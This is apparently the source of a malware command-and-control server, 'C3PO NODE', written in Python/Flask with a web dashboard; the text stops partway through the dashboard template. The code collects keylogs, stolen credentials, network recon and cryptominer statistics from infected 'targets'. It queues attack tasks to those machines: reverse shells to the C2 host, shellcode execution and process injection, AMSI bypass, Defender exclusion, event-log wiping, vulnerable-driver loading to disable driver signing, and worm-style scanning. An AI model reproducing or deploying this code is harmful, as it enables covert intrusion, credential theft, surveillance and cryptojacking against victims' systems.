#!/usr/bin/env python3
"""
C3PO NODE SERVER  v1.5.0
Persistent monitoring C2.
Port is configurable via config.json (default 9000), plain HTTP (trusted LAN).
"""

from flask import Flask, request, jsonify, render_template_string, redirect, url_for, send_from_directory, make_response
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
import sqlite3, json, time, os, uuid, secrets, subprocess, re, base64
from datetime import datetime

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    _CRYPTO_OK = True
except ImportError:
    _CRYPTO_OK = False

# ── config ────────────────────────────────────────────────────────────────────

BASE       = os.path.dirname(os.path.abspath(__file__))
DB         = os.path.join(BASE, 'node.db')
UPLOADS    = os.path.join(BASE, 'uploads')
MINER_BINS = os.path.join(BASE, 'miner_bins')
CFG_FILE   = os.path.join(BASE, 'config.json')
VERSION    = '1.5.0'

def _load_config():
    """Load config.json, creating it with random credentials on first run."""
    if os.path.exists(CFG_FILE):
        with open(CFG_FILE) as f:
            return json.load(f)
    cfg = {
        'port':        9000,
        'admin_user':  'admin',
        'admin_pass':  secrets.token_urlsafe(16),
        'secret_key':  secrets.token_hex(32),
        'c2_aes_key':  secrets.token_urlsafe(24),  # 32-char ASCII — update aesKeyObf in agent/crypto.go to match
        'c2_aes_iv':   secrets.token_urlsafe(12),  # 16-char ASCII — update aesIVObf  in agent/crypto.go to match
    }
    with open(CFG_FILE, 'w') as f:
        json.dump(cfg, f, indent=2)
    print(f'[*] First run — config written to {CFG_FILE}')
    print(f'[*] Admin user: {cfg["admin_user"]}')
    print(f'[*] Admin pass: {cfg["admin_pass"]}')
    print(f'[*] AES key:    {cfg["c2_aes_key"]}  ← XOR-encode and set aesKeyObf in agent/crypto.go')
    print(f'[*] AES IV:     {cfg["c2_aes_iv"]}  ← XOR-encode and set aesIVObf  in agent/crypto.go')
    return cfg

_cfg = _load_config()
PORT       = int(_cfg.get('port', 9000))
ADMIN_USER = _cfg.get('admin_user', 'admin')
ADMIN_PASS = _cfg.get('admin_pass', secrets.token_urlsafe(16))

# AES-256-CBC key/IV loaded from config — must match aesKeyObf/aesIVObf in agent/crypto.go.
# Use scripts/encrypt_c2.py to generate the XOR-encoded agent arrays from these values.
C2_AES_KEY = _cfg.get('c2_aes_key', '').encode()[:32]
C2_AES_IV  = _cfg.get('c2_aes_iv',  '').encode()[:16]

def c2_decrypt(b64_str):
    if not _CRYPTO_OK or not C2_AES_KEY:
        return None
    try:
        data = base64.b64decode(b64_str)
        cipher = AES.new(C2_AES_KEY, AES.MODE_CBC, C2_AES_IV)
        return unpad(cipher.decrypt(data), 16).decode('utf-8')
    except Exception:
        return None

def c2_encrypt(plaintext_str):
    if not _CRYPTO_OK or not C2_AES_KEY:
        return plaintext_str
    try:
        cipher = AES.new(C2_AES_KEY, AES.MODE_CBC, C2_AES_IV)
        return base64.b64encode(cipher.encrypt(pad(plaintext_str.encode(), 16))).decode()
    except Exception:
        return plaintext_str

app = Flask(__name__)
app.secret_key = _cfg.get('secret_key', secrets.token_hex(32))

limiter = Limiter(key_func=get_remote_address, app=app, storage_uri='memory://',
                  default_limits=['200 per minute'])

# Server-side session store — avoids all browser cookie-signing issues
_sessions: dict = {}

os.makedirs(UPLOADS, exist_ok=True)
os.makedirs(MINER_BINS, exist_ok=True)

# ── database ───────────────────────────────────────────────────────────────────

def db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with db() as conn:
        conn.executescript('''
            CREATE TABLE IF NOT EXISTS nodes (
                agent_id   TEXT PRIMARY KEY,
                hostname   TEXT,
                username   TEXT,
                os         TEXT,
                arch       TEXT,
                local_ips  TEXT,
                version    TEXT,
                first_seen REAL,
                last_seen  REAL
            );
            CREATE TABLE IF NOT EXISTS tasks (
                task_id      TEXT PRIMARY KEY,
                agent_id     TEXT,
                type         TEXT,
                payload      TEXT,
                status       TEXT DEFAULT 'pending',
                output       TEXT,
                created_at   REAL,
                completed_at REAL
            );
            CREATE TABLE IF NOT EXISTS keylogs (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id    TEXT,
                data        TEXT,
                received_at REAL
            );
            CREATE TABLE IF NOT EXISTS netmon (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id    TEXT,
                connections TEXT,
                received_at REAL
            );
            CREATE TABLE IF NOT EXISTS discovered (
                id            INTEGER PRIMARY KEY AUTOINCREMENT,
                discovered_by TEXT,
                ip            TEXT UNIQUE,
                hostname      TEXT,
                open_ports    TEXT,
                has_smb       INTEGER DEFAULT 0,
                first_seen    REAL
            );
            CREATE TABLE IF NOT EXISTS agent_versions (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                version     TEXT,
                filename    TEXT,
                notes       TEXT,
                uploaded_at REAL,
                is_current  INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS inventories (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id     TEXT,
                collected_at TEXT,
                data         TEXT,
                received_at  REAL
            );
            CREATE TABLE IF NOT EXISTS credentials (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id     TEXT,
                source       TEXT,
                type         TEXT,
                url          TEXT,
                username     TEXT,
                secret       TEXT,
                file_path    TEXT,
                context_text TEXT,
                pattern      TEXT,
                received_at  REAL
            );
            CREATE TABLE IF NOT EXISTS miner_stats (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id    TEXT,
                coin        TEXT,
                hashrate    REAL,
                accepted    INTEGER DEFAULT 0,
                rejected    INTEGER DEFAULT 0,
                uptime_secs INTEGER DEFAULT 0,
                gpu_name    TEXT,
                cpu_name    TEXT,
                pool        TEXT,
                received_at REAL
            );
            CREATE TABLE IF NOT EXISTS netintel (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id    TEXT,
                scan_time   TEXT,
                host_ip     TEXT,
                hostname    TEXT,
                open_ports  TEXT,
                smb_shares  TEXT,
                wmi_procs   TEXT,
                redis_info  TEXT,
                mongo_open  INTEGER DEFAULT 0,
                notes       TEXT,
                raw         TEXT,
                received_at REAL
            );
            CREATE TABLE IF NOT EXISTS nmap_scans (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                target      TEXT,
                host_ip     TEXT,
                open_ports  TEXT,
                raw_output  TEXT,
                scanned_at  REAL
            );
            CREATE TABLE IF NOT EXISTS quick_targets (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                label      TEXT NOT NULL,
                value      TEXT NOT NULL,
                created_at REAL
            );
        ''')

init_db()

# ── auth (server-side token, no Flask session cookies) ────────────────────────

ADMIN_HASH = generate_password_hash(ADMIN_PASS)
COOKIE_NAME = 'c3po_tok'

def _get_token():
    return request.cookies.get(COOKIE_NAME, '')

def is_authed():
    tok = _get_token()
    return bool(tok and _sessions.get(tok))

def require_auth(f):
    @wraps(f)
    def inner(*args, **kwargs):
        if not is_authed():
            return redirect('/login')
        return f(*args, **kwargs)
    return inner

# ── template filters ───────────────────────────────────────────────────────────

@app.template_filter('dt')
def fmt_dt(ts):
    try:
        return datetime.fromtimestamp(float(ts)).strftime('%Y-%m-%d %H:%M:%S')
    except:
        return '—'

@app.template_filter('ago')
def time_ago(ts):
    try:
        s = time.time() - float(ts)
        if s < 60:    return f'{int(s)}s ago'
        if s < 3600:  return f'{int(s/60)}m ago'
        if s < 86400: return f'{int(s/3600)}h ago'
        return f'{int(s/86400)}d ago'
    except:
        return '—'

@app.template_filter('online')
def is_online(ts):
    try:
        return (time.time() - float(ts)) < 120
    except:
        return False

# ── HTML template ──────────────────────────────────────────────────────────────

HTML = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>C3PO NODE</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0f;color:#c9d1d9;font-family:'Courier New',monospace;font-size:13px}
a{color:#58a6ff;text-decoration:none}
/* header */
.hdr{background:#161b22;border-bottom:1px solid #21262d;padding:10px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
.hdr-title{color:#58a6ff;font-size:16px;font-weight:bold;letter-spacing:2px}
.hdr-meta{color:#8b949e;font-size:11px}
.hdr-actions{display:flex;gap:8px;align-items:center}
.hdr-actions a{color:#8b949e;font-size:11px;border:1px solid #30363d;padding:4px 10px;border-radius:4px}
.hdr-actions a:hover{color:#c9d1d9;border-color:#58a6ff}
/* layout */
.main{display:flex;height:calc(100vh - 45px)}
.sidebar{width:260px;min-width:260px;background:#161b22;border-right:1px solid #21262d;display:flex;flex-direction:column;overflow:hidden}
.content{flex:1;overflow-y:auto;padding:16px}
/* sidebar nav */
.nav-section{padding:12px 12px 4px;color:#8b949e;font-size:10px;text-transform:uppercase;letter-spacing:1px;border-top:1px solid #21262d}
.nav-item{padding:8px 16px;cursor:pointer;border-left:2px solid transparent;color:#8b949e;display:flex;justify-content:space-between;align-items:center}
.nav-item:hover,.nav-item.active{background:#1c2128;border-left-color:#58a6ff;color:#c9d1d9}
.badge{background:#21262d;color:#8b949e;border-radius:10px;padding:1px 7px;font-size:10px}
.badge.green{background:#1a4731;color:#3fb950}
.badge.red{background:#3d1717;color:#f85149}
/* stats bar */
.stats{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap}
.stat{background:#161b22;border:1px solid #21262d;border-radius:6px;padding:12px 18px;flex:1;min-width:120px}
.stat-val{font-size:24px;font-weight:bold;color:#58a6ff}
.stat-lbl{color:#8b949e;font-size:11px;margin-top:2px}
/* tab panels */
.panel{display:none}.panel.active{display:block}
/* tables */
table{width:100%;border-collapse:collapse}
th{background:#161b22;color:#8b949e;font-size:11px;text-transform:uppercase;letter-spacing:.5px;padding:8px 10px;text-align:left;border-bottom:1px solid #21262d}
td{padding:7px 10px;border-bottom:1px solid #161b22;vertical-align:top}
tr:hover td{background:#161b22}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
.dot-green{background:#3fb950}
.dot-red{background:#f85149}
/* command panel */
.cmd-panel{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:16px}
.cmd-panel h3{color:#58a6ff;margin-bottom:12px;font-size:13px}
.cmd-row{display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap}
.cmd-row select,.cmd-row input{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:7px 10px;border-radius:5px;font-family:inherit;font-size:12px}
.cmd-row select{flex:0 0 auto}
.cmd-row input{flex:1;min-width:200px}
.btn{background:#1f6feb;color:#fff;border:none;padding:7px 16px;border-radius:5px;cursor:pointer;font-family:inherit;font-size:12px}
.btn:hover{background:#388bfd}
.btn-sm{padding:3px 10px;font-size:11px}
.btn-danger{background:#da3633}
.btn-danger:hover{background:#f85149}
.btn-green{background:#1a4731;color:#3fb950;border:1px solid #3fb950}
.btn-green:hover{background:#196c2e}
/* output */
.output-box{background:#0d1117;border:1px solid #21262d;border-radius:5px;padding:10px;font-size:11px;max-height:200px;overflow-y:auto;white-space:pre-wrap;color:#c9d1d9;margin-top:8px}
/* keylog */
.keylog-entry{background:#0d1117;border:1px solid #21262d;border-radius:5px;padding:10px;margin-bottom:8px;font-size:11px}
.keylog-meta{color:#8b949e;font-size:10px;margin-bottom:6px}
.keylog-data{white-space:pre-wrap;color:#e6edf3}
/* netmon */
.process-tag{display:inline-block;background:#1c2128;border:1px solid #30363d;border-radius:3px;padding:1px 6px;font-size:10px;color:#79c0ff;margin:1px}
.process-tag.highlight{border-color:#f78166;color:#f78166}
/* section headers */
.section-hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.section-hdr h2{color:#e6edf3;font-size:14px}
/* update */
.version-row{display:flex;align-items:center;gap:12px;padding:10px;background:#0d1117;border-radius:5px;margin-bottom:6px;border:1px solid #21262d}
.version-current{border-color:#3fb950}
.form-row{display:flex;gap:8px;align-items:center;margin-bottom:8px}
.form-row input[type=text],.form-row input[type=file]{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:7px 10px;border-radius:5px;font-family:inherit;font-size:12px}
.form-row input[type=file]{color:#8b949e}
</style>
</head>
<body>

<div class="hdr">
  <div class="hdr-title">&#9679; C3PO NODE</div>
  <div class="hdr-meta">v{{ server_version }} &nbsp;|&nbsp; {{ now }}</div>
  <div class="hdr-actions">
    <a href="/logout">Logout</a>
  </div>
</div>

<div class="main">
  <!-- sidebar -->
  <div class="sidebar">
    <div class="nav-section">Overview</div>
    <div class="nav-item active" onclick="show('nodes')">
      Nodes <span class="badge green">{{ nodes|length }}</span>
    </div>
    <div class="nav-item" onclick="show('tasks')">
      Tasks <span class="badge {% if pending_count > 0 %}red{% endif %}">{{ pending_count }}</span>
    </div>

    <div class="nav-section">Intelligence</div>
    <div class="nav-item" onclick="show('keylogs')">
      Keylogs <span class="badge">{{ keylog_count }}</span>
    </div>
    <div class="nav-item" onclick="show('netmon')">
      API Traffic <span class="badge">{{ netmon_count }}</span>
    </div>
    <div class="nav-item" onclick="show('discovered')">
      Network Map <span class="badge">{{ disc_count }}</span>
    </div>
    <div class="nav-item" onclick="show('netintel')" style="color:#79c0ff">
      Net Intel <span class="badge">{{ netintel_count }}</span>
    </div>
    <div class="nav-item" onclick="show('inventory')">
      Inventory <span class="badge">{{ inv_count }}</span>
    </div>
    <div class="nav-item" onclick="show('credentials')" style="color:#f78166">
      Credentials <span class="badge red">{{ cred_count }}</span>
    </div>

    <div class="nav-section">Operations</div>
    <div class="nav-item" onclick="show('command')">
      Command
    </div>
    <div class="nav-item" onclick="show('mining')" style="color:#3fb950">
      Mining <span class="badge green">{{ mining_active }}</span>
    </div>
    <div class="nav-item" onclick="show('updates')">
      Updates
    </div>
    <div class="nav-item" onclick="show('nmap')" style="color:#d2a8ff">
      Nmap Scanner
    </div>
  </div>

  <!-- content -->
  <div class="content">

    <!-- stats -->
    <div class="stats">
      <div class="stat"><div class="stat-val">{{ online_count }}</div><div class="stat-lbl">Online Nodes</div></div>
      <div class="stat"><div class="stat-val">{{ nodes|length }}</div><div class="stat-lbl">Total Nodes</div></div>
      <div class="stat"><div class="stat-val">{{ completed_tasks }}</div><div class="stat-lbl">Commands Executed</div></div>
      <div class="stat"><div class="stat-val">{{ keylog_count }}</div><div class="stat-lbl">Keylog Batches</div></div>
      <div class="stat"><div class="stat-val">{{ disc_count }}</div><div class="stat-lbl">Hosts Discovered</div></div>
      <div class="stat" style="border-color:{% if cred_count > 0 %}#f85149{% else %}#21262d{% endif %}">
        <div class="stat-val" style="color:{% if cred_count > 0 %}#f85149{% else %}#58a6ff{% endif %}">{{ cred_count }}</div>
        <div class="stat-lbl">Credential Findings</div>
      </div>
    </div>

    <!-- ── NODES ── -->
    <div id="panel-nodes" class="panel active">
      <div class="section-hdr"><h2>Connected Nodes</h2></div>
      <table>
        <thead><tr>
          <th>Status</th><th>Agent ID</th><th>Host</th><th>User</th>
          <th>OS</th><th>IPs</th><th>Version</th><th>Last Seen</th>
        </tr></thead>
        <tbody>
        {% for n in nodes %}
        <tr>
          <td>
            {% if n['last_seen']|online %}
              <span class="dot dot-green"></span>Online
            {% else %}
              <span class="dot dot-red"></span>Offline
            {% endif %}
          </td>
          <td><code>{{ n['agent_id'][:12] }}…</code></td>
          <td><strong>{{ n['hostname'] }}</strong></td>
          <td>{{ n['username'] }}</td>
          <td>{{ n['os'] }}</td>
          <td style="font-size:11px;color:#8b949e">{{ n['local_ips'] }}</td>
          <td>{{ n['version'] }}</td>
          <td>{{ n['last_seen']|ago }}</td>
        </tr>
        {% else %}
        <tr><td colspan="8" style="color:#555;text-align:center;padding:20px">No nodes connected yet — run the agent on a target</td></tr>
        {% endfor %}
        </tbody>
      </table>
    </div>

    <!-- ── TASKS ── -->
    <div id="panel-tasks" class="panel">
      <div class="section-hdr">
        <h2>Task Queue</h2>
        <div style="display:flex;gap:10px;align-items:center">
          <input id="task-filter" type="text" placeholder="Filter by type, node, payload…"
            style="background:#0d1117;border:1px solid #30363d;color:#e6edf3;padding:5px 10px;border-radius:4px;width:240px;font-size:12px"
            oninput="filterTasks(this.value)">
          <label style="color:#8b949e;font-size:11px;display:flex;gap:4px;align-items:center">
            <input type="checkbox" id="hide-cancelled" onchange="filterTasks(document.getElementById('task-filter').value)" checked>
            Hide cancelled
          </label>
        </div>
      </div>
      <table>
        <thead><tr>
          <th>ID</th><th>Node</th><th>Type</th><th>Payload</th>
          <th>Status</th><th>Output</th><th>Time</th>
        </tr></thead>
        <tbody>
        {% for t in tasks %}
        {% set st = t['status'] %}
        <tr class="task-row" data-status="{{ st }}" data-type="{{ t['type'] }}"
            data-node="{{ t['agent_id'][:12] }}" data-payload="{{ t['payload'][:80] }}"
            {% if st == 'cancelled' %}style="opacity:0.35"{% endif %}>
          <td><code style="color:#556">{{ t['task_id'][:8] }}</code></td>
          <td style="font-size:11px;color:#8b949e">{{ t['agent_id'][:10] }}…</td>
          <td><span class="process-tag">{{ t['type'] }}</span></td>
          <td style="max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px;color:#8b949e" title="{{ t['payload'] }}">
            {{ t['payload'] or '—' }}
          </td>
          <td>
            {% if st in ('completed','ok') %}
              <span style="color:#3fb950">&#10003; done</span>
            {% elif st == 'pending' %}
              <span style="color:#d29922">&#9679; pending</span>
            {% elif st == 'sent' %}
              <span style="color:#58a6ff">&#8594; sent</span>
            {% elif st == 'cancelled' %}
              <span style="color:#30363d">&#8212; cancelled</span>
            {% elif st == 'error' %}
              <span style="color:#f85149">&#10007; error</span>
            {% else %}
              <span style="color:#8b949e">{{ st }}</span>
            {% endif %}
          </td>
          <td>
            {% if t['output'] %}
              <details><summary style="cursor:pointer;color:#58a6ff;font-size:11px">view output</summary>
              <pre style="margin-top:6px;font-size:10px;white-space:pre-wrap;color:#c9d1d9;background:#0d1117;padding:8px;border-radius:4px;max-height:200px;overflow-y:auto">{{ t['output'][:1000] }}</pre>
              </details>
            {% else %}<span style="color:#30363d">—</span>{% endif %}
          </td>
          <td style="font-size:10px;color:#556;white-space:nowrap">{{ t['created_at']|dt }}</td>
        </tr>
        {% else %}
        <tr><td colspan="7" style="color:#555;text-align:center;padding:30px">No tasks yet — send a command from the Command tab</td></tr>
        {% endfor %}
        </tbody>
      </table>
      <script>
      function filterTasks(q) {
        q = (q||'').toLowerCase();
        const hideCancelled = document.getElementById('hide-cancelled').checked;
        document.querySelectorAll('.task-row').forEach(row => {
          const cancelled = row.dataset.status === 'cancelled';
          if (hideCancelled && cancelled) { row.style.display = 'none'; return; }
          const match = !q ||
            (row.dataset.type||'').includes(q) ||
            (row.dataset.node||'').includes(q) ||
            (row.dataset.payload||'').toLowerCase().includes(q) ||
            (row.dataset.status||'').includes(q);
          row.style.display = match ? '' : 'none';
          row.style.opacity = cancelled ? '0.35' : '';
        });
      }
      // Run on load to apply hide-cancelled default
      filterTasks('');
      </script>
    </div>

    <!-- ── COMMAND ── -->
    <div id="panel-command" class="panel">
      <div class="section-hdr"><h2>Command Interface</h2></div>
      <div class="cmd-panel">
        <form id="cmd-form" onsubmit="return validateCmd(event)">
        <div class="cmd-row" style="margin-bottom:12px">
          <select name="agent_id" id="cmd-agent" required style="width:200px">
            <option value="">— Select Node —</option>
            {% for n in nodes %}
            <option value="{{ n['agent_id'] }}">{{ n['hostname'] }} \ {{ n['username'] }}</option>
            {% endfor %}
          </select>
          <select name="type" id="cmd-type" onchange="onTypeChange()" style="width:160px">
            <optgroup label="Shell">
              <option value="exec">exec — cmd.exe</option>
              <option value="ps">ps — PowerShell</option>
              <option value="revshell">revshell — reverse shell</option>
            </optgroup>
            <optgroup label="Collection">
              <option value="harvest">harvest — credential scan</option>
              <option value="inventory">inventory — full system info</option>
              <option value="keylog_flush">keylog_flush — flush keylogs</option>
            </optgroup>
            <optgroup label="Recon">
              <option value="spread">spread — subnet ping scan</option>
              <option value="worm_scan">worm_scan — deep host intel</option>
            </optgroup>
            <optgroup label="Persistence">
              <option value="persist_check">persist_check — verify installed</option>
              <option value="persist_remove">persist_remove — uninstall</option>
              <option value="update">update — self-update agent</option>
            </optgroup>
            <optgroup label="Offense">
              <option value="shellcode">shellcode — run shellcode</option>
              <option value="inject">inject — process injection</option>
              <option value="amsi_bypass">amsi_bypass — patch AMSI</option>
            </optgroup>
            <optgroup label="⚠ Danger">
              <option value="clear_logs">clear_logs — wipe event logs</option>
              <option value="ppl_protect">ppl_protect — make process unkillable</option>
              <option value="byovd_arm">byovd_arm — load gdrv.sys / disable DSE</option>
              <option value="self_destruct">self_destruct — delete agent from disk</option>
            </optgroup>
            <optgroup label="Mining">
              <option value="mine_start">mine_start</option>
              <option value="mine_stop">mine_stop</option>
              <option value="mine_status">mine_status</option>
            </optgroup>
          </select>
          <select id="cmd-preset" onchange="applyPreset(this)" style="width:220px">
            <option value="">— Quick Presets —</option>
            <optgroup label="Identity">
              <option value="exec:whoami /all">whoami /all</option>
              <option value="exec:net user">net user</option>
              <option value="exec:net localgroup administrators">local admins</option>
              <option value="exec:query session">active sessions</option>
            </optgroup>
            <optgroup label="System">
              <option value="exec:systeminfo">systeminfo</option>
              <option value="exec:tasklist /v">tasklist /v</option>
              <option value="exec:wmic cpu get Name,NumberOfCores,LoadPercentage">CPU info</option>
              <option value="exec:wmic diskdrive get Model,Size,MediaType">Disk info</option>
            </optgroup>
            <optgroup label="Network">
              <option value="exec:ipconfig /all">ipconfig /all</option>
              <option value="exec:netstat -an">netstat -an</option>
              <option value="exec:arp -a">arp table</option>
              <option value="exec:route print">routing table</option>
              <option value="ps:Get-NetTCPConnection -State Established | Select LocalPort,RemoteAddress,RemotePort,@{N='Proc';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).ProcessName}} | Sort Proc | Format-Table -Auto">TCP connections by process</option>
            </optgroup>
            <optgroup label="Processes / Ports">
              <option value="ps:Get-Process python,pythonw,node,javaw,java -EA SilentlyContinue | Select Name,Id,@{N='CPU';E={[math]::Round($_.CPU,1)}},@{N='MemMB';E={[math]::Round($_.WorkingSet64/1MB,1)}} | Format-Table -Auto">Dev processes (python/node/java)</option>
              <option value="ps:Get-NetTCPConnection -State Established | Where-Object { (Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name -in 'python','pythonw','node','java','javaw' } | Select LocalPort,RemoteAddress,RemotePort,@{N='Proc';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}} | Format-Table -Auto">Dev process active connections</option>
              <option value="ps:Get-NetTCPConnection -State Listen | Select LocalPort,@{N='Proc';E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).ProcessName}} | Sort LocalPort | Format-Table -Auto">All listening ports + process</option>
              <option value="ps:netsh trace start capture=yes tracefile=$env:TEMP\net_capture.etl maxsize=50 overwrite=yes; Start-Sleep 30; netsh trace stop; &quot;Capture saved to $env:TEMP\net_capture.etl&quot;">Capture 30s of network traffic (ETL)</option>
            </optgroup>
            <optgroup label="Security">
              <option value="ps:Get-MpComputerStatus | Select RealTimeProtectionEnabled,AntivirusEnabled,AntivirusSignatureLastUpdated">Defender status</option>
              <option value="ps:Get-MpThreatDetection | Select ThreatName,ActionSuccess,InitialDetectionTime,Resources | Format-List">Defender threat history</option>
              <option value="ps:Get-NetFirewallProfile | Select Name,Enabled">Firewall status</option>
              <option value="ps:Add-MpPreference -ExclusionPath &quot;$env:APPDATA\Microsoft\Windows\Themes&quot; -ErrorAction SilentlyContinue; echo &quot;exclusion set&quot;">Set Defender exclusion (needs admin)</option>
            </optgroup>
            <optgroup label="Persistence">
              <option value="ps:Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\Microsoft\*'} | Select TaskName,State | Format-Table">Non-Microsoft scheduled tasks</option>
              <option value="ps:Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run">Run keys (user)</option>
              <option value="ps:Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run">Run keys (system)</option>
            </optgroup>
            <optgroup label="Shell">
              <option value="revshell:C2_IP:4444">Reverse shell → C2_IP:4444</option>
            </optgroup>
          </select>
        </div>

        <!-- Dynamic payload area -->
        <div id="payload-area" style="margin-bottom:10px">
          <div id="payload-hint" style="font-size:11px;color:#8b949e;margin-bottom:4px"></div>
          <div class="cmd-row">
            <textarea id="payload-input" name="payload" rows="3"
              style="flex:1;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:8px 10px;border-radius:5px;font-family:'Courier New',monospace;font-size:12px;resize:vertical"
              placeholder=""></textarea>
          </div>
        </div>
        <div id="cmd-error" style="color:#f85149;font-size:11px;margin-bottom:8px;display:none"></div>
        <button type="submit" class="btn" style="min-width:120px">&#9654; Send Task</button>
        </form>

        {% if flash_task %}
        <div class="output-box" style="margin-top:10px">Task queued: {{ flash_task }}</div>
        {% endif %}
      </div>

      <script>
      const typeConfig = {
        exec:          { payload: true,  ph: 'Windows command  e.g.  whoami /all', hint: 'Runs via cmd.exe /c — no PowerShell, no semicolons' },
        ps:            { payload: true,  ph: 'PowerShell script — multi-line ok', hint: 'Runs as: powershell -NoProfile -NonInteractive -Command <script>' },
        revshell:      { payload: true,  ph: 'IP:PORT  e.g.  192.168.1.10:4444', hint: 'Opens a reverse PowerShell shell. Start listener first:  nc -lvnp 4444' },
        shellcode:     { payload: true,  ph: 'BASE64_SHELLCODE  or  KEY:BASE64_SHELLCODE', hint: 'Raw shellcode as base64. Optional XOR key prefix: key:b64data' },
        inject:        { payload: true,  ph: 'remote PID BASE64SC  |  hollow C:\\path\\to.exe BASE64SC', hint: 'remote = inject into existing PID. hollow = spawn+hollow a new process' },
        mine_start:    { payload: true,  ph: 'COIN WALLET [POOL] [CPU%]  e.g.  xmr WALLET pool.supportxmr.com:443 80', hint: 'COIN: xmr or zeph. CPU%: 0-100 (default 80). GPU=1 to enable GPU.' },
        harvest:       { payload: false, hint: 'Scans files, env vars, browser passwords, AWS creds. No payload needed.' },
        inventory:     { payload: false, hint: 'Collects installed software, hardware, users, shares. No payload needed.' },
        spread:        { payload: false, hint: 'Pings entire /24 subnet. Reports live hosts + open ports. No payload needed.' },
        worm_scan:     { payload: false, hint: 'Deep scan: banner grab, HTTP scrape, SMB, Redis, MongoDB. No payload needed.' },
        persist_check: { payload: false, hint: 'Checks if persistence is installed in AppData\\Themes. No payload needed.' },
        persist_remove:{ payload: false, hint: 'Removes persistence from AppData\\Themes and scheduled task. No payload needed.' },
        clear_logs:    { payload: false, hint: '⚠ Clears System, Security, Application event logs via wevtutil. Irreversible.' },
        ppl_protect:   { payload: false, hint: '⚠ Marks agent as PPL (Protected Process Light) — Task Manager cannot kill it. Requires SeTcbPrivilege.' },
        byovd_arm:     { payload: false, hint: '⚠ Downloads gdrv.sys from C2, loads driver, disables DSE. Requires gdrv.sys in uploads/. BSOD risk.' },
        self_destruct: { payload: false, hint: '⚠ Deletes the agent EXE from disk using ping-delay + del. Persistence entries remain — remove separately.' },
        update:        { payload: false, hint: 'Downloads latest agent from C2 and replaces itself. No payload needed.' },
        keylog_flush:  { payload: false, hint: 'Forces immediate upload of buffered keylog data. No payload needed.' },
        amsi_bypass:   { payload: false, hint: 'Patches AmsiScanBuffer in memory — disables AMSI for this session.' },
        mine_stop:     { payload: false, hint: 'Stops the miner process. No payload needed.' },
        mine_status:   { payload: false, hint: 'Returns current miner stats. No payload needed.' },
      };

      function onTypeChange() {
        const type = document.getElementById('cmd-type').value;
        const cfg  = typeConfig[type] || { payload: true, ph: '', hint: '' };
        const area = document.getElementById('payload-input');
        const hint = document.getElementById('payload-hint');
        const pa   = document.getElementById('payload-area');
        hint.textContent = cfg.hint;
        if (cfg.payload) {
          pa.style.display = '';
          area.placeholder = cfg.ph;
          area.style.borderColor = '#30363d';
        } else {
          pa.style.display = 'none';
          area.value = '';
        }
        document.getElementById('cmd-error').style.display = 'none';
      }

      function applyPreset(sel) {
        const val = sel.value;
        if (!val) return;
        const colon = val.indexOf(':');
        const type    = val.slice(0, colon);
        const payload = val.slice(colon + 1);
        document.getElementById('cmd-type').value = type;
        onTypeChange();
        document.getElementById('payload-input').value = payload;
        sel.value = '';
      }

      function validateCmd(e) {
        e.preventDefault();
        const agent = document.getElementById('cmd-agent').value;
        const type  = document.getElementById('cmd-type').value;
        const payload = document.getElementById('payload-input').value.trim();
        const errEl = document.getElementById('cmd-error');
        errEl.style.display = 'none';

        if (!agent) { errEl.textContent = 'Select a node first'; errEl.style.display = ''; return false; }

        const cfg = typeConfig[type] || { payload: true };
        if (cfg.payload && !payload) {
          errEl.textContent = 'Payload required for ' + type + '  —  ' + (typeConfig[type]?.ph || '');
          errEl.style.display = '';
          return false;
        }
        if (type === 'revshell' && !/^\d+\.\d+\.\d+\.\d+:\d+$/.test(payload)) {
          errEl.textContent = 'revshell payload must be IP:PORT  e.g.  192.168.1.10:4444';
          errEl.style.display = '';
          return false;
        }
        if (type === 'shellcode' && payload && !/^[A-Za-z0-9+/=]+$/.test(payload.split(':').pop())) {
          errEl.textContent = 'shellcode payload must be base64-encoded bytes (optionally KEY:BASE64)';
          errEl.style.display = '';
          return false;
        }

        // Submit via fetch so we stay on the page
        const form = new FormData();
        form.append('agent_id', agent);
        form.append('type', type);
        form.append('payload', payload);
        fetch('/admin/task', {method:'POST', body:form}).then(r => {
          if (r.ok) {
            const el = document.createElement('div');
            el.className = 'output-box';
            el.style.marginTop = '10px';
            el.textContent = '✓ Task queued: ' + type + (payload ? '  →  ' + payload.slice(0,60) : '');
            document.getElementById('cmd-form').appendChild(el);
            setTimeout(() => el.remove(), 4000);
          }
        });
        return false;
      }

      onTypeChange(); // init on load
      </script>

      {% if recent_results %}
